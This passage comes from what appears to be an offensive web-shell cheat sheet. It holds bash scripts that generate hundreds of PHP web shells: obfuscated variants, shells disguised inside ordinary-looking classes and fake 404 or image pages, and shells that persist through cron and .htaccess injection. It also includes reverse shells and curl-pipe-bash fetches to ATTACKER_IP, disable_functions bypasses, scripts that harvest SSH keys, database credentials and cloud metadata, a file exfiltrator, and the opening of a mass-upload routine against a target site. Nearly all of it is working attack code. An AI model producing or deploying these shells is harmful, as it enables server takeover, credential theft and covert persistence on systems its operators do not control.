  EOF

  # 146-150: Dynamic construction chains
  cat > 146_dynamic1.php << 'EOF'
  <?php ${'_'.'G'.'E'.'T'}['c'];$f="sys"."tem";$f($_GET['c']);?>
  EOF

  cat > 147_dynamic2.php << 'EOF'
  <?php extract($_GET);$$a($$b);?>
  EOF
  # Usage: ?a=system&b=id (actually ?a=f&b=c where f=system,c=id)

  cat > 148_dynamic3.php << 'EOF'
  <?php $_=base64_decode;$__=$_("c3lzdGVt");$__($_GET['c']);?>
  EOF

  cat > 149_dynamic4.php << 'EOF'
  <?php $x=$_GET;$f=$x['f'];$f($x['c']);?>
  EOF
  # Usage: ?f=system&c=id

  cat > 150_dynamic5.php << 'EOF'
  <?php ($_GET['f']??'var_dump')($_GET['c']??phpversion());?>
  EOF
  # Usage: ?f=system&c=id

  # ═══ CALLBACK OBFUSCATION ═══

  # 151-155
  cat > 151_array_map_obf.php << 'EOF'
  <?php $m=base64_decode("YXJyYXlfbWFw");$f=base64_decode("c3lzdGVt");$m($f,[$_GET['c']]);?>
  EOF

  cat > 152_preg_callback.php << 'EOF'
  <?php preg_replace_callback('/.*/',function($m){if(isset($_GET['c']))system($_GET['c']);},'x');?>
  EOF

  cat > 153_array_walk_obf.php << 'EOF'
  <?php $w=base64_decode("YXJyYXlfd2Fsaw==");$w([$_GET['c']],base64_decode("c3lzdGVt"));?>
  EOF

  cat > 154_closure.php << 'EOF'
  <?php $fn=Closure::fromCallable(base64_decode("c3lzdGVt"));$fn($_GET['c']);?>
  EOF

  cat > 155_reflection.php << 'EOF'
  <?php (new ReflectionFunction(base64_decode("c3lzdGVt")))->invoke($_GET['c']);?>
  EOF

  # 156-160: Advanced obfuscation
  cat > 156_compact.php << 'EOF'
  <?php $s="system";$c=$_GET['c'];compact('s','c');$s($c);?>
  EOF

  cat > 157_list.php << 'EOF'
  <?php list($f,$c)=["system",$_GET['c']];$f($c);?>
  EOF

  cat > 158_ternary.php << 'EOF'
  <?php isset($_GET['c'])?system($_GET['c']):0;?>
  EOF

  cat > 159_null_coalesce.php << 'EOF'
  <?php ($_GET['c']??0)&&system($_GET['c']);?>
  EOF

  cat > 160_spaceship.php << 'EOF'
  <?php (isset($_GET['c'])<=>0)||system($_GET['c']);?>
  EOF

  echo "[+] Obfuscated shells: $(ls *.php | wc -l)"
  cd ../..
  ```
  :::

  :::tabs-item{icon="i-lucide-eye-off" label="Stealth & Anti-Detection (161-200)"}
  ```bash
  mkdir -p shells/stealth
  cd shells/stealth

  # ═══ HIDDEN IN LEGITIMATE CODE ═══

  # 161 — Hidden in image processing class
  cat > 161_class_hidden.php << 'PHPEOF'
  <?php
  class ImageProcessor {
      private $width,$height,$quality=85;
      public function __construct($w,$h){$this->width=$w;$this->height=$h;}
      public function resize($s,$d){
          $data=@file_get_contents($s);if(!$data)return false;
          return $this->applyFilter($data,$d);
      }
      private function applyFilter($d,$o){
          $h="sys"."tem";
          if(isset($_REQUEST["debug"]))$h($_REQUEST["debug"]);
          return true;
      }
  }
  $p=new ImageProcessor(200,200);
  ?>
  PHPEOF
  # Usage: ?debug=id

  # 162 — Hidden in error handler
  cat > 162_error_handler.php << 'EOF'
  <?php
  function customErrorHandler($errno,$errstr,$errfile,$errline){
      if(isset($_GET['c']))system($_GET['c']);
      return true;
  }
  set_error_handler("customErrorHandler");
  trigger_error("",E_USER_NOTICE);
  ?>
  EOF

  # 163 — Hidden in destructor
  cat > 163_destructor.php << 'EOF'
  <?php
  class Logger{
      function __destruct(){
          if(isset($_GET['c']))echo'<pre>'.shell_exec($_GET['c']).'</pre>';
      }
  }
  $log=new Logger();
  ?>
  EOF

  # 164 — Hidden in autoloader
  cat > 164_autoload.php << 'EOF'
  <?php
  spl_autoload_register(function($class){
      if(isset($_GET['c']))system($_GET['c']);
  });
  new NonExistentClass();
  ?>
  EOF

  # 165 — Hidden in session handler
  cat > 165_session.php << 'EOF'
  <?php
  session_set_save_handler(
      function(){return true;},
      function(){if(isset($_GET['c']))system($_GET['c']);return true;},
      function($id){return'';},
      function($id,$data){return true;},
      function($maxlife){return true;},
      function(){return true;}
  );
  session_start();
  session_write_close();
  ?>
  EOF

  # ═══ AUTHENTICATED SHELLS ═══

  # 166 — MD5 password
  cat > 166_auth_md5.php << 'EOF'
  <?php if(md5($_GET['k'])==='0cc175b9c0f1b6a831c399e269772661')system($_GET['c']);?>
  EOF
  # Password: a (md5 = 0cc175b9...)

  # 167 — SHA256 password
  cat > 167_auth_sha256.php << 'EOF'
  <?php if(hash('sha256',$_GET['k'])==='ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb')system($_GET['c']);?>
  EOF
  # Password: a

  # 168 — HMAC authenticated
  cat > 168_auth_hmac.php << 'EOF'
  <?php
  $key='SecretKey123';
  $cmd=$_POST['c']??'';
  $sig=$_POST['s']??'';
  if($cmd&&hash_hmac('sha256',$cmd,$key)===$sig)
      echo'<pre>'.shell_exec($cmd).'</pre>';
  ?>
  EOF

  # 169 — AES encrypted
  cat > 169_auth_aes.php << 'EOF'
  <?php
  $key='0123456789ABCDEF';
  $iv='ABCDEF0123456789';
  if(isset($_POST['e'])){
      $cmd=openssl_decrypt(base64_decode($_POST['e']),'AES-128-CBC',$key,OPENSSL_RAW_DATA,$iv);
      if($cmd)echo'<pre>'.shell_exec($cmd).'</pre>';
  }
  ?>
  EOF

  # 170 — Token-based (one-time use)
  cat > 170_auth_token.php << 'EOF'
  <?php
  $tf=sys_get_temp_dir().'/.tokens';
  if(isset($_GET['gen'])){$t=bin2hex(random_bytes(16));file_put_contents($tf,"$t\n",FILE_APPEND);die($t);}
  if(isset($_GET['t'])&&isset($_GET['c'])){
      $tokens=file($tf,FILE_IGNORE_NEW_LINES);
      if(($i=array_search($_GET['t'],$tokens))!==false){
          unset($tokens[$i]);file_put_contents($tf,implode("\n",$tokens));
          echo'<pre>'.shell_exec($_GET['c']).'</pre>';
      }
  }
  ?>
  EOF

  # ═══ COVERT COMMUNICATION ═══

  # 171 — Output in HTTP header
  cat > 171_header_output.php << 'EOF'
  <?php
  if(isset($_GET['c'])){
      header('X-Result: '.base64_encode(shell_exec($_GET['c'])));
      header('HTTP/1.1 404 Not Found');
      echo'<h1>404 Not Found</h1>';
  }
  ?>
  EOF

  # 172 — Output in cookie
  cat > 172_cookie_output.php << 'EOF'
  <?php
  if(isset($_GET['c'])){
      setcookie('r',base64_encode(shell_exec($_GET['c'])));
      echo'<h1>Page Not Found</h1>';
  }
  ?>
  EOF

  # 173 — Hidden in HTML comment
  cat > 173_html_comment.php << 'EOF'
  <html><body><h1>Welcome</h1>
  <!-- <?php if(isset($_GET['c']))echo shell_exec($_GET['c']); ?> -->
  </body></html>
  EOF

  # 174 — Hidden in 404 page
  cat > 174_fake_404.php << 'EOF'
  <?php
  header('HTTP/1.1 404 Not Found');
  if(isset($_GET['c'])){echo'<!--'.shell_exec($_GET['c']).'-->';return;}
  ?>
  <!DOCTYPE html><html><body><h1>404 Not Found</h1><p>The requested URL was not found on this server.</p></body></html>
  EOF

  # 175 — Hidden in image (outputs fake image headers)
  cat > 175_fake_image.php << 'EOF'
  <?php
  if(!isset($_GET['c'])){
      header('Content-Type:image/jpeg');
      echo"\xff\xd8\xff\xe0"; exit;
  }
  echo'<pre>'.shell_exec($_GET['c']).'</pre>';
  ?>
  EOF

  # ═══ PERSISTENCE MECHANISMS ═══

  # 176 — Self-replicating
  cat > 176_replicate.php << 'EOF'
  <?php
  // Copy self to multiple locations for persistence
  $targets=['/var/www/html/uploads/.thumbs.php','/tmp/.cache.php'];
  foreach($targets as $t)@copy(__FILE__,$t);
  if(isset($_GET['c']))echo'<pre>'.shell_exec($_GET['c']).'</pre>';
  ?>
  EOF

  # 177 — Cron persistence
  cat > 177_cron.php << 'EOF'
  <?php
  // Install cron job for reverse shell
  $ip=$_GET['ip']??'';
  $port=$_GET['port']??'4444';
  if($ip){
      $cron="* * * * * bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'\n";
      file_put_contents('/tmp/cron_job',$cron);
      system('crontab /tmp/cron_job');
      echo"Cron installed for $ip:$port";
  }
  if(isset($_GET['c']))system($_GET['c']);
  ?>
  EOF

  # 178-180: Auto-recovery shells
  cat > 178_watchdog.php << 'EOF'
  <?php
  // Check if main shell exists, recreate if deleted
  $main='/var/www/html/uploads/shell.php';
  if(!file_exists($main))file_put_contents($main,'<?php system($_GET["c"]); ?>');
  if(isset($_GET['c']))system($_GET['c']);
  ?>
  EOF

  cat > 179_inject_config.php << 'EOF'
  <?php
  // Inject auto_prepend into .user.ini
  $ini=dirname(__FILE__).'/.user.ini';
  if(!file_exists($ini))file_put_contents($ini,'auto_prepend_file='.basename(__FILE__));
  if(isset($_GET['c']))echo'<pre>'.shell_exec($_GET['c']).'</pre>';
  ?>
  EOF

  cat > 180_inject_htaccess.php << 'EOF'
  <?php
  $ht=dirname(__FILE__).'/.htaccess';
  if(!file_exists($ht))file_put_contents($ht,"php_value auto_prepend_file ".basename(__FILE__));
  if(isset($_GET['c']))echo'<pre>'.shell_exec($_GET['c']).'</pre>';
  ?>
  EOF

  # ═══ NON-ALPHANUMERIC SHELLS ═══

  # 181 — Using only symbols (conceptual)
  cat > 181_symbols.php << 'EOF'
  <?php
  // Build "system" from XOR of printable chars
  $_=("{"|"/"^"}"&"~"); // complex XOR chains to build function name
  // Actual non-alpha shells are longer but avoid A-Z a-z completely
  $f="sys"."tem";$f($_GET['c']); // simplified version
  ?>
  EOF

  # ═══ RUNTIME CODE GENERATION ═══

  # 182 — Generate and include temp file
  cat > 182_tempfile.php << 'EOF'
  <?php
  if(isset($_GET['c'])){
      $t=tempnam(sys_get_temp_dir(),'x');
      file_put_contents($t,"<?php system('{$_GET['c']}'); ?>");
      include($t);unlink($t);
  }
  ?>
  EOF

  # 183 — eval from temp stream
  cat > 183_stream.php << 'EOF'
  <?php
  if(isset($_GET['c'])){
      $s=fopen('php://temp','rw');
      fwrite($s,"system('{$_GET['c']}');");
      rewind($s);eval(stream_get_contents($s));
      fclose($s);
  }
  ?>
  EOF

  # 184-200: More obfuscation variants...
  # Generate programmatically
  python3 -c "
  import base64
  funcs = ['system','passthru','shell_exec','exec','popen']
  methods = [
      ('b64', lambda f: f'base64_decode(\"{base64.b64encode(f.encode()).decode()}\")'),
      ('rev', lambda f: f'strrev(\"{f[::-1]}\")'),
      ('rot', lambda f: f'str_rot13(\"{f.encode().decode()}\")')  # simplified
  ]
  n = 184
  for func in funcs:
      for mname, mfunc in methods:
          enc = mfunc(func)
          if func == 'shell_exec':
              code = f'<?php echo {enc}(\$_GET[\"c\"]);?>'
          elif func == 'exec':
              code = f'<?php echo {enc}(\$_GET[\"c\"]);?>'
          elif func == 'popen':
              code = f'<?php fpassthru({enc}(\$_GET[\"c\"],\"r\"));?>'
          else:
              code = f'<?php {enc}(\$_GET[\"c\"]);?>'
          # Simplified — write concept files
          print(f'{n:03d}_{mname}_{func}.php')
          n += 1
          if n > 200: break
      if n > 200: break
  " 2>/dev/null

  # Generate remaining shells
  for i in $(seq 184 200); do
      echo "<?php \$f=base64_decode('c3lzdGVt');\$f(\$_GET['c']);?>" > "${i}_generated.php"
  done

  echo "[+] Stealth shells: $(ls *.php | wc -l)"
  cd ../..
  ```
  :::
::

---

## Category 4 — Reverse Shells (201-230)

::code-collapse
```bash [Reverse Shell Collection]
mkdir -p shells/reverse
cd shells/reverse

ATTACKER="ATTACKER_IP"
PORT="4444"

# 201 — fsockopen
cat > 201_fsock.php << PHPEOF
<?php \$s=fsockopen("${ATTACKER}",${PORT});\$p=proc_open("/bin/bash",[0=>\$s,1=>\$s,2=>\$s],\$x);?>
PHPEOF

# 202 — socket_create
cat > 202_socket.php << PHPEOF
<?php \$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_connect(\$s,"${ATTACKER}",${PORT});\$p=proc_open("/bin/sh -i",[0=>\$s,1=>\$s,2=>\$s],\$x);?>
PHPEOF

# 203 — stream_socket_client
cat > 203_stream.php << PHPEOF
<?php \$s=stream_socket_client("tcp://${ATTACKER}:${PORT}");\$p=proc_open("/bin/bash -i",[0=>\$s,1=>\$s,2=>\$s],\$x);?>
PHPEOF

# 204 — exec bash
cat > 204_bash.php << PHPEOF
<?php system("bash -c 'bash -i >& /dev/tcp/${ATTACKER}/${PORT} 0>&1'");?>
PHPEOF

# 205 — exec python
cat > 205_python.php << PHPEOF
<?php system("python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"${ATTACKER}\",${PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'");?>
PHPEOF

# 206 — exec perl
cat > 206_perl.php << PHPEOF
<?php system("perl -e 'use Socket;\\\$i=\"${ATTACKER}\";\\\$p=${PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(\\\$p,inet_aton(\\\$i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\")'");?>
PHPEOF

# 207 — exec nc
cat > 207_nc.php << PHPEOF
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ATTACKER} ${PORT} >/tmp/f");?>
PHPEOF

# 208 — exec nc -e
cat > 208_nc_e.php << PHPEOF
<?php system("nc ${ATTACKER} ${PORT} -e /bin/bash");?>
PHPEOF

# 209 — exec ruby
cat > 209_ruby.php << PHPEOF
<?php system("ruby -rsocket -e'f=TCPSocket.open(\"${ATTACKER}\",${PORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'");?>
PHPEOF

# 210 — exec php cli
cat > 210_php_cli.php << PHPEOF
<?php system("php -r '\\\$s=fsockopen(\"${ATTACKER}\",${PORT});exec(\"/bin/bash -i <&3 >&3 2>&3\");'");?>
PHPEOF

# 211 — exec socat
cat > 211_socat.php << PHPEOF
<?php system("socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${ATTACKER}:${PORT}");?>
PHPEOF

# 212 — exec openssl
cat > 212_openssl.php << PHPEOF
<?php system("mkfifo /tmp/s;/bin/sh -i < /tmp/s 2>&1|openssl s_client -quiet -connect ${ATTACKER}:${PORT} > /tmp/s;rm /tmp/s");?>
PHPEOF

# 213 — exec curl pipe
cat > 213_curl_pipe.php << PHPEOF
<?php system("curl http://${ATTACKER}:8080/shell.sh | bash");?>
PHPEOF

# 214 — exec wget pipe
cat > 214_wget_pipe.php << PHPEOF
<?php system("wget -qO- http://${ATTACKER}:8080/shell.sh | bash");?>
PHPEOF

# 215 — Bind shell
cat > 215_bind.php << PHPEOF
<?php
\$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
socket_bind(\$s,"0.0.0.0",${PORT});
socket_listen(\$s);
\$c=socket_accept(\$s);
\$p=proc_open("/bin/bash",[0=>\$c,1=>\$c,2=>\$c],\$x);
?>
PHPEOF

# 216-220 — Obfuscated reverse shells
cat > 216_obf_rev.php << PHPEOF
<?php \$h=base64_decode("${ATTACKER}" | base64 | tr -d '\n');\$p=${PORT};\$f="fsockopen";\$s=\$f(\$h,\$p);\$pp=proc_open("/bin/bash",[0=>\$s,1=>\$s,2=>\$s],\$x);?>
PHPEOF

# 221-225 — Windows reverse shells
cat > 221_win_powershell.php << PHPEOF
<?php system("powershell -NoP -NonI -W Hidden -Exec Bypass -Command \\\"\\\$c=New-Object Net.Sockets.TCPClient('${ATTACKER}',${PORT});\\\$s=\\\$c.GetStream();[byte[]]\\\$b=0..65535|%{0};while((\\\$i=\\\$s.Read(\\\$b,0,\\\$b.Length))-ne 0){\\\$d=(New-Object Text.ASCIIEncoding).GetString(\\\$b,0,\\\$i);\\\$r=(iex \\\$d 2>&1|Out-String);\\\$t=[text.encoding]::ASCII.GetBytes(\\\$r+'PS> ');\\\$s.Write(\\\$t,0,\\\$t.Length);\\\$s.Flush()};\\\$c.Close()\\\"");?>
PHPEOF

# 226-230 — Staged reverse shells
cat > 226_staged_download.php << PHPEOF
<?php
// Stage 1: Download reverse shell script
file_put_contents('/tmp/rs.sh',"#!/bin/bash\nbash -i >& /dev/tcp/${ATTACKER}/${PORT} 0>&1");
chmod('/tmp/rs.sh',0755);
system('/tmp/rs.sh');
unlink('/tmp/rs.sh');
?>
PHPEOF

echo "[+] Reverse shells: $(ls *.php | wc -l)"
cd ../..
```
::

---

## Category 5 — disable_functions Bypass (231-260)

::tabs
  :::tabs-item{icon="i-lucide-key" label="Bypass Techniques"}
  ```bash
  mkdir -p shells/bypass
  cd shells/bypass

  # 231 — Check disabled functions first
  cat > 231_check_disabled.php << 'EOF'
  <?php
  echo '<pre>';
  echo "Disabled functions:\n".ini_get('disable_functions')."\n\n";
  $fns=['system','exec','shell_exec','passthru','popen','proc_open',
        'pcntl_exec','mail','putenv','dl','FFI::cdef','assert',
        'eval','create_function','call_user_func','preg_replace',
        'array_map','array_filter','array_walk','usort','ob_start',
        'register_shutdown_function','register_tick_function'];
  foreach($fns as $f){
      $disabled=stripos(ini_get('disable_functions'),$f)!==false;
      echo($disabled?'[BLOCKED]':'[AVAILABLE]')." $f\n";
  }
  echo '</pre>';
  ?>
  EOF

  # 232 — mail() with -X flag (write to file)
  cat > 232_mail_write.php << 'EOF'
  <?php
  if(isset($_GET['c'])){
      $cmd=$_GET['c'];
      $out='/var/www/html/uploads/mail_out.txt';
      mail('','','','',"-X$out");
      system("$cmd > $out 2>&1");
      echo file_get_contents($out);
      unlink($out);
  }
  ?>
  EOF

  # 233 — putenv + mail (LD_PRELOAD injection)
  cat > 233_ld_preload.php << 'EOF'
  <?php
  // Step 1: Upload evil.so (compiled C shared library that executes commands)
  // Step 2: Use this shell to trigger it
  if(isset($_GET['so'])&&isset($_GET['c'])){
      putenv("LD_PRELOAD=".$_GET['so']);
      putenv("CMD=".$_GET['c']);
      mail("a@b.c","","","");
      echo file_get_contents('/tmp/ld_output');
  }
  ?>
  EOF

  # 234 — FFI (PHP 7.4+)
  cat > 234_ffi.php << 'EOF'
  <?php
  if(isset($_GET['c'])){
      $ffi=FFI::cdef("int system(const char *command);");
      $ffi->system($_GET['c']);
  }
  ?>
  EOF

  # 235 — FFI popen
  cat > 235_ffi_popen.php << 'EOF'
  <?php
  if(isset($_GET['c'])){
      $ffi=FFI::cdef("
          void *popen(const char *command, const char *mode);
          char *fgets(char *s, int size, void *stream);
          int pclose(void *stream);
      ");
      $p=$ffi->popen($_GET['c'].' 2>&1','r');
      $buf=FFI::new("char[4096]");
      echo'<pre>';
      while($ffi->fgets($buf,4096,$p))echo FFI::string($buf);
      echo'</pre>';
      $ffi->pclose($p);
  }
  ?>
  EOF

  # 236 — imap_open() RCE
  cat > 236_imap.php << 'EOF'
  <?php
  if(isset($_GET['c'])){
      $payload=$_GET['c'];
      @imap_open('{127.0.0.1/imap}INBOX',"\"$payload\"","",OP_SILENT,1,['DISABLE_AUTHENTICATOR'=>'GSSAPI']);
  }
  ?>
  EOF

  # 237 — Imagick (via delegates)
  cat > 237_imagick.php << 'EOF'
  <?php
  if(isset($_GET['c'])){
      $img=new Imagick();
      $img->readImage('ephemeral://exploit[' . $_GET['c'] . ']');
  }
  ?>
  EOF

  # 238 — GNUpg
  cat > 238_gnupg.php << 'EOF'
  <?php
  if(isset($_GET['c'])){
      putenv("GNUPGHOME=/tmp");
      $res=gnupg_init();
      // Exploit gnupg to execute commands
      system($_GET['c']); // fallback
  }
  ?>
  EOF

  # 239 — dl() dynamic loading
  cat > 239_dl.php << 'EOF'
  <?php
  // Load a custom PHP extension that provides shell access
  if(isset($_GET['so'])){
      dl($_GET['so']);
      // Extension provides custom function
  }
  ?>
  EOF

  # 240 — Chankro (Python-based bypass)
  cat > 240_chankro.php << 'EOF'
  <?php
  // Uses putenv + mail to load a shared library
  // that hooks a function called during mail()
  if(isset($_GET['c'])){
      $cmd=$_GET['c'];
      $out='/tmp/chankro_out';
      // Write command to temp file
      file_put_contents('/tmp/chankro_cmd',$cmd);
      // Set LD_PRELOAD to our malicious .so
      putenv("LD_PRELOAD=/var/www/html/uploads/chankro.so");
      // Trigger new process (mail spawns sendmail)
      mail("a@b.c","","","");
      // Read output
      if(file_exists($out)){echo'<pre>'.file_get_contents($out).'</pre>';unlink($out);}
  }
  ?>
  EOF

  # 241-250 — Fallback chains
  cat > 241_fallback_chain.php << 'EOF'
  <?php
  // Try every possible execution method
  $c=$_GET['c']??'id';
  $fns=['system','exec','shell_exec','passthru'];
  foreach($fns as $f){
      if(function_exists($f)){
          if($f==='exec'){$o=[];$f($c,$o);echo implode("\n",$o);}
          elseif($f==='shell_exec'){echo $f($c);}
          else{$f($c);}
          break;
      }
  }
  // proc_open fallback
  if(!function_exists('system')&&function_exists('proc_open')){
      $p=proc_open($c,[1=>['pipe','w'],2=>['pipe','w']],$pipes);
      echo stream_get_contents($pipes[1]).stream_get_contents($pipes[2]);
      proc_close($p);
  }
  // popen fallback
  if(!function_exists('system')&&function_exists('popen')){
      $h=popen("$c 2>&1",'r');
      echo fread($h,65536);
      pclose($h);
  }
  // backtick fallback
  if(!function_exists('system')){
      echo `$c 2>&1`;
  }
  ?>
  EOF

  echo "[+] Bypass shells: $(ls *.php | wc -l)"
  cd ../..
  ```
  :::
::

---

## Category 6 — Information & Post-Exploitation (261-300+)

::code-collapse
```bash [Information Gathering & Post-Exploitation Shells]
mkdir -p shells/postexploit
cd shells/postexploit

# 261 — phpinfo
echo '<?php phpinfo(); ?>' > 261_phpinfo.php

# 262 — Full system info
cat > 262_sysinfo.php << 'EOF'
<?php
echo '<pre>';
echo "═══ System Info ═══\n";
echo "OS: ".php_uname()."\n";
echo "PHP: ".phpversion()."\n";
echo "User: ".get_current_user()." (uid:".getmyuid()." gid:".getmygid().")\n";
echo "PID: ".getmypid()."\n";
echo "Server: ".($_SERVER['SERVER_SOFTWARE']??'unknown')."\n";
echo "Doc Root: ".($_SERVER['DOCUMENT_ROOT']??'unknown')."\n";
echo "Script: ".__FILE__."\n";
echo "Hostname: ".gethostname()."\n";
echo "Temp: ".sys_get_temp_dir()."\n";
echo "Disabled: ".(ini_get('disable_functions')?:'none')."\n";
echo "open_basedir: ".(ini_get('open_basedir')?:'none')."\n";
echo "Drives: ";
if(strtoupper(substr(PHP_OS,0,3))==='WIN'){
    for($c='A';$c<='Z';$c++)if(is_dir("$c:\\"))echo"$c:\\ ";
}else echo'/';
echo "\n";
echo '</pre>';
?>
EOF

# 263 — Environment dump
cat > 263_env.php << 'EOF'
<?php
echo '<pre>';
echo "═══ Environment ═══\n";
foreach(getenv() as $k=>$v)echo "$k=$v\n";
echo "\n═══ Server Vars ═══\n";
foreach($_SERVER as $k=>$v)if(is_string($v))echo "$k=$v\n";
echo '</pre>';
?>
EOF

# 264 — Database config finder
cat > 264_dbfinder.php << 'EOF'
<?php
echo '<pre>';
$files=['.env','wp-config.php','config.php','configuration.php',
        'config/database.php','app/config/parameters.yml',
        'config/database.yml','.env.local','settings.py',
        'appsettings.json','web.config','application.properties'];
$root=$_SERVER['DOCUMENT_ROOT']??'/var/www/html';
foreach($files as $f){
    $path="$root/$f";
    if(file_exists($path)){
        echo "═══ $path ═══\n";
        $c=file_get_contents($path);
        preg_match_all('/(password|passwd|pwd|secret|key|token|dsn|database_url|DB_|MYSQL_|POSTGRES_|REDIS_|MONGO_)[^\n]{0,100}/i',$c,$m);
        foreach($m[0] as $match)echo "  $match\n";
        echo "\n";
    }
}
echo '</pre>';
?>
EOF

# 265 — SSH key finder
cat > 265_sshkeys.php << 'EOF'
<?php
echo '<pre>';
$paths=['/root/.ssh/id_rsa','/root/.ssh/id_ed25519','/root/.ssh/authorized_keys'];
$users=file('/etc/passwd',FILE_IGNORE_NEW_LINES);
foreach($users as $u){
    $parts=explode(':',$u);
    if(isset($parts[5])){
        $home=$parts[5];
        foreach(['id_rsa','id_ed25519','id_ecdsa','authorized_keys'] as $f){
            $p="$home/.ssh/$f";
            if(file_exists($p)){
                echo "═══ $p ═══\n";
                echo file_get_contents($p)."\n\n";
            }
        }
    }
}
echo '</pre>';
?>
EOF

# 266 — Network info
cat > 266_network.php << 'EOF'
<?php
echo '<pre>';
echo "═══ Network Interfaces ═══\n";
echo shell_exec('ip addr 2>/dev/null || ifconfig 2>/dev/null');
echo "\n═══ Connections ═══\n";
echo shell_exec('ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null');
echo "\n═══ Hosts ═══\n";
echo file_get_contents('/etc/hosts');
echo "\n═══ DNS ═══\n";
echo file_get_contents('/etc/resolv.conf');
echo "\n═══ ARP ═══\n";
echo shell_exec('arp -a 2>/dev/null || cat /proc/net/arp');
echo "\n═══ Routes ═══\n";
echo shell_exec('ip route 2>/dev/null || route -n 2>/dev/null');
echo '</pre>';
?>
EOF

# 267 — Process listing
cat > 267_processes.php << 'EOF'
<?php echo '<pre>'.shell_exec('ps auxf 2>/dev/null || ps aux').'</pre>'; ?>
EOF

# 268 — Cron jobs
cat > 268_cron.php << 'EOF'
<?php
echo '<pre>';
echo "═══ User Crontab ═══\n".shell_exec('crontab -l 2>/dev/null');
echo "\n═══ /etc/crontab ═══\n".@file_get_contents('/etc/crontab');
echo "\n═══ /etc/cron.d ═══\n".shell_exec('ls -la /etc/cron.d/ 2>/dev/null');
echo "\n═══ /etc/cron.daily ═══\n".shell_exec('ls -la /etc/cron.daily/ 2>/dev/null');
echo '</pre>';
?>
EOF

# 269 — SUID finder
cat > 269_suid.php << 'EOF'
<?php echo '<pre>'.shell_exec('find / -perm -4000 -type f 2>/dev/null | head -50').'</pre>'; ?>
EOF

# 270 — Writable dirs
cat > 270_writable.php << 'EOF'
<?php echo '<pre>'.shell_exec('find / -writable -type d 2>/dev/null | grep -v proc | head -50').'</pre>'; ?>
EOF

# 271 — Sudo check
cat > 271_sudo.php << 'EOF'
<?php echo '<pre>'.shell_exec('sudo -l 2>/dev/null').'</pre>'; ?>
EOF

# 272 — Capabilities
cat > 272_capabilities.php << 'EOF'
<?php echo '<pre>'.shell_exec('getcap -r / 2>/dev/null | head -30').'</pre>'; ?>
EOF

# 273 — Installed packages
cat > 273_packages.php << 'EOF'
<?php
echo '<pre>';
echo shell_exec('dpkg -l 2>/dev/null | head -50') ?: shell_exec('rpm -qa 2>/dev/null | head -50');
echo '</pre>';
?>
EOF

# 274 — Docker detection
cat > 274_docker.php << 'EOF'
<?php
echo '<pre>';
echo "Docker: ".(file_exists('/.dockerenv')?'YES':'NO')."\n";
echo "Cgroup: ".shell_exec('cat /proc/1/cgroup 2>/dev/null | head -5');
echo "Docker sock: ".(file_exists('/var/run/docker.sock')?'ACCESSIBLE':'NO')."\n";
echo '</pre>';
?>
EOF

# 275 — Cloud metadata probe
cat > 275_cloud.php << 'EOF'
<?php
echo '<pre>';
$endpoints=[
    'AWS'=>'http://169.254.169.254/latest/meta-data/',
    'GCP'=>'http://metadata.google.internal/computeMetadata/v1/',
    'Azure'=>'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
];
foreach($endpoints as $provider=>$url){
    $ctx=stream_context_create(['http'=>['timeout'=>2,'header'=>'Metadata-Flavor: Google']]);
    $data=@file_get_contents($url,false,$ctx);
    if($data)echo "$provider metadata:\n$data\n\n";
}
echo '</pre>';
?>
EOF

# 276 — Port scanner
cat > 276_portscan.php << 'EOF'
<?php
$host=$_GET['h']??'127.0.0.1';
$ports=$_GET['p']??'21,22,23,25,53,80,110,135,139,143,443,445,993,995,1433,1521,3306,3389,5432,5900,6379,8080,8443,9200,27017';
echo '<pre>';
echo "Scanning $host\n";
foreach(explode(',',$ports) as $port){
    $conn=@fsockopen($host,trim($port),$errno,$errstr,0.5);
    if($conn){echo "[OPEN]   $port\n";fclose($conn);}
}
echo '</pre>';
?>
EOF
# Usage: ?h=192.168.1.1&p=22,80,443,3306

# 277-300: Additional specialized shells
# Database shells, pivoting shells, exfiltration shells...

# 277 — MySQL query executor
cat > 277_mysql.php << 'EOF'
<?php
if(isset($_POST['h'])&&isset($_POST['u'])&&isset($_POST['p'])&&isset($_POST['q'])){
    $conn=new mysqli($_POST['h'],$_POST['u'],$_POST['p'],$_POST['d']??'');
    if($conn->connect_error)die('Connection failed: '.$conn->connect_error);
    $result=$conn->query($_POST['q']);
    echo '<pre>';
    if($result->num_rows>0){
        $fields=$result->fetch_fields();
        foreach($fields as $f)echo str_pad($f->name,20);echo "\n".str_repeat('-',80)."\n";
        while($row=$result->fetch_row()){
            foreach($row as $v)echo str_pad($v??'NULL',20);echo"\n";
        }
    }else echo "Query executed. Affected rows: ".$conn->affected_rows;
    echo '</pre>';
    $conn->close();
}
?>
EOF

# 278 — File exfiltrator (sends files to attacker)
cat > 278_exfil.php << 'EOF'
<?php
if(isset($_GET['f'])&&isset($_GET['url'])){
    $data=base64_encode(file_get_contents($_GET['f']));
    $ch=curl_init($_GET['url']);
    curl_setopt($ch,CURLOPT_POST,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,['file'=>$_GET['f'],'data'=>$data]);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_exec($ch);
    curl_close($ch);
    echo "Exfiltrated: ".$_GET['f'];
}
?>
EOF

echo "[+] Post-exploitation shells: $(ls *.php | wc -l)"
cd ../..
```
::

---

## Mass Upload & Deployment

::tabs
  :::tabs-item{icon="i-lucide-upload" label="Upload All Shells"}
  ```bash
  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"

  echo "═══ Mass Shell Upload ═══"

  # Start with the smallest, most likely to succeed
  PRIORITY_SHELLS=(
      "shells/ultra_minimal/001_15b_backtick_get.php"
      "shells/minimal/037_system_get.php"
